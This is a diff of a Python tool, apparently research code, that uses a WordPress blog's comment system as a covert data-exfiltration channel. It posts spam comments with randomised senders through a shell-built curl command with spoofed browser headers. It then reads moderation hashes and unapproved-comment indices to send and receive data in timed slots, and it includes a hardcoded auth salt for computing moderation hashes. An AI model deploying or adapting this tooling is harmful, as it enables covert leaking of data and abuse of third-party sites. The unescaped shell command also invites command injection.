@@ -80,44 +80,6 @@ def get_post_id(blog_url, channel_url):
     
     return -1
 
-def submit_comment(blog_url, post_id, comment):
-    curl_command = "curl '" + blog_url
-    curl_command += """wp-comments-post.php' -H 'Connection: keep-alive' \
-      -H 'Cache-Control: max-age=0' \
-      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
-      -H 'sec-ch-ua-mobile: ?1' \
-      -H 'Upgrade-Insecure-Requests: 1' \
-      -H 'Origin: http://127.0.0.3' \
-      -H 'Content-Type: application/x-www-form-urlencoded' \
-      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
-      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
-      -H 'Sec-Fetch-Site: same-origin' \
-      -H 'Sec-Fetch-Mode: navigate' \
-      -H 'Sec-Fetch-User: ?1' \
-      -H 'Sec-Fetch-Dest: document' \
-      -H 'Referer: """
-    curl_command += blog_url
-    curl_command += "' -H 'Accept-Language: en-US,en;q=0.9' --data-raw 'author="
-    curl_command += comment.sender.name + "&email=" + comment.sender.email + "&url=&submit=Post+Comment&comment_post_ID="
-    curl_command += str(post_id) + "&comment_parent=0&comment="
-    curl_command += comment.comment + "' --compressed -Ls -w \"%{http_code},%{url_effective}\"" # -o /dev/null"
-    curl_output = subprocess.check_output(curl_command, shell=True)
-    return CommentResponse(curl_output.decode())
-
-def delay_to_timeslot(time_slot):
-    # Waits until the next time slot
-
-    current_date = datetime.datetime.utcnow()
-    target_date = get_next_timeslot_date(current_date, time_slot)
-
-    time_diff = target_date - current_date
-    log_print("[INFO] Delaying until " + str(target_date) + ": " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins", 2)
-
-    time.sleep(time_diff.seconds + (time_diff.microseconds / 1000000))
-
-def generate_random_string(length):
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
-
 def get_next_timeslot_date(current_datetime, target_timeslot):
     current_minute = current_datetime.time().minute
     current_seconds = current_datetime.time().second
@@ -160,13 +122,6 @@ def get_previous_valid_timeslot_date(current_datetime, time_slot):
 
     return target_date
 
-def compute_moderation_hash(date_str, auth_key, auth_salt):
-    salt = auth_key + auth_salt
-    
-    assert(salt == "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1ea30c9849bfd208c9890cbf7bb56f59a20b52c4f")
-    computed_hash = hmac.new(salt.encode(), date_str.encode(), 'md5').hexdigest()
-    return computed_hash
-
 def get_unapproved_index_from_url(url):
     url_parsed = urllib.parse.urlparse(url)
     queries = urllib.parse.parse_qs(url_parsed.query)
@@ -184,6 +139,22 @@ def get_moderation_hash_from_url(url):
         return queries['moderation-hash'][0]
     else:
         return None
+
+def get_current_unapproved_index(channel):
+    comment = Comment()
+    comment.sender = generate_random_sender()
+    comment.comment_id = ""
+    comment.comment = generate_random_spam_comment()
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
+    return response.unapproved_index
+
+def get_moderation_hash_at_current_time(channel):
+    comment = Comment()
+    comment.sender = generate_random_sender()
+    comment.comment_id = ""
+    comment.comment = generate_random_spam_comment()
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
+    return response.moderation_hash, response.unapproved_index
 
 def send_data(channel, comment, send_config):
     while True:
@@ -220,22 +191,6 @@ def send_data(channel, comment, send_config):
                 break
         else:
             break
-
-def get_current_unapproved_index(channel):
-    comment = Comment()
-    comment.sender = generate_random_sender()
-    comment.comment_id = ""
-    comment.comment = generate_random_spam_comment()
-    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
-    return response.unapproved_index
-
-def get_moderation_hash_at_current_time(channel):
-    comment = Comment()
-    comment.sender = generate_random_sender()
-    comment.comment_id = ""
-    comment.comment = generate_random_spam_comment()
-    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
-    return response.moderation_hash, response.unapproved_index
 
 def receive_data(channel, num_of_receivers, recv_config):
     received_data = []
@@ -309,3 +264,38 @@ def fetch_comments_page(comments_url):
     """
     curl_output = subprocess.check_output(fetch_comments_command, shell=True)
     return curl_output.decode()
+
+def submit_comment(blog_url, post_id, comment):
+    curl_command = "curl '" + blog_url
+    curl_command += """wp-comments-post.php' -H 'Connection: keep-alive' \
+      -H 'Cache-Control: max-age=0' \
+      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
+      -H 'sec-ch-ua-mobile: ?1' \
+      -H 'Upgrade-Insecure-Requests: 1' \
+      -H 'Origin: http://127.0.0.3' \
+      -H 'Content-Type: application/x-www-form-urlencoded' \
+      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
+      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+      -H 'Sec-Fetch-Site: same-origin' \
+      -H 'Sec-Fetch-Mode: navigate' \
+      -H 'Sec-Fetch-User: ?1' \
+      -H 'Sec-Fetch-Dest: document' \
+      -H 'Referer: """
+    curl_command += blog_url
+    curl_command += "' -H 'Accept-Language: en-US,en;q=0.9' --data-raw 'author="
+    curl_command += comment.sender.name + "&email=" + comment.sender.email + "&url=&submit=Post+Comment&comment_post_ID="
+    curl_command += str(post_id) + "&comment_parent=0&comment="
+    curl_command += comment.comment + "' --compressed -Ls -w \"%{http_code},%{url_effective}\"" # -o /dev/null"
+    curl_output = subprocess.check_output(curl_command, shell=True)
+    return CommentResponse(curl_output.decode())
+
+def delay_to_timeslot(time_slot):
+    # Waits until the next time slot
+
+    current_date = datetime.datetime.utcnow()
+    target_date = get_next_timeslot_date(current_date, time_slot)
+
+    time_diff = target_date - current_date
+    log_print("[INFO] Delaying until " + str(target_date) + ": " + str(time_diff.seconds) + "." + str(time_diff.microseconds) + " or ~" + str(time_diff.seconds/60) + " mins", 2)
+
+    time.sleep(time_diff.seconds + (time_diff.microseconds / 1000000))
